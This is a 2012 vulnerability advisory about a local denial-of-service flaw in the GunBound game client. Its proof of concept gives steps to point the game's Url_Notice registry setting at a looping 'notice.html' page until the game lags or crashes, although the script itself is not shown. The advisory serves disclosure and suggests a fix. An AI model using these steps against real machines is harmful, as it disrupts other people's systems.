Introduction:
=============
GunBound (Korean: is a free-to-play, turn-based, room-to-room, multiplayer online game with many similar 
features to the popular Worms game series. GunBound was developed and is maintained by South Korean developer Softnyx. 
It is currently in its third major release, subtitled Season 2 internationally. It was called GunBound Revolution in 
North America with ijji as its host before it was shut down on July 24, 2009. The first major beta release 
was Thor s Hammer.

Abstract:
=========
A Vulnerability Laboratory Researcher (X-Cisadane) discovered a local Denial of Service Vulnerability in the official GunBound Game.


Report-Timeline:
================
2012-07-16:	Public or Non-Public Disclosure


Status:
========
Published


Exploitation-Technique:
=======================
Local


Severity:
=========
Medium


Details:
========
A denial of service vulnerability is detected in the official korean GunBound web browser game. 
The vulnerability allows local attackers to inject own strings or html codes as notice.html to 
slow down the application browser game via (example html loop. The denial of service vulnerability 
is located WebHost element of the game software. Successful exploitation results in heavy laggs and
stable persistent software crashs.

Vulnerable Element(s):
			[+] WebHost Address Element - notice.html


Proof of Concept:
=================
The vulnerability can be exploited by local attacker with privileged user or system account.
For demonstration or reproduce ...

[1]   Install the newst version of GunBound from the website.
[2]   Upload 1ST Script or 2ND Script into your WebHost and named with notice.html. 
      Note: IF you don't have WebHost, you can use Local Web Server Software such : XAMPP, WAMP, Vertrigoserv, etc.
[3]   Edit GunBound Registry : HKLM\SOFTWARE\SoftNyx\GunBound. 
      Find Url_Notice then right click and select Modify, fill with : http://[SERVER|HOST]/notice.html OR http://127.0.0.1/notice.html
[4]   Save the setting and startup the game to play a round! 
[5]   VOILA your machine/system crashs or laggs very heavy.

Solution:
=========
The vulnerability can be patched by parsing the input of the WebHost element in the GunBound software.
The notice.html file execution (example|listing) should can be fixed by parsing the executable listing in the software itself.


Risk:
=====
The security risk of the local denial of service vulnerability is estimated as low(+)|medium(-).
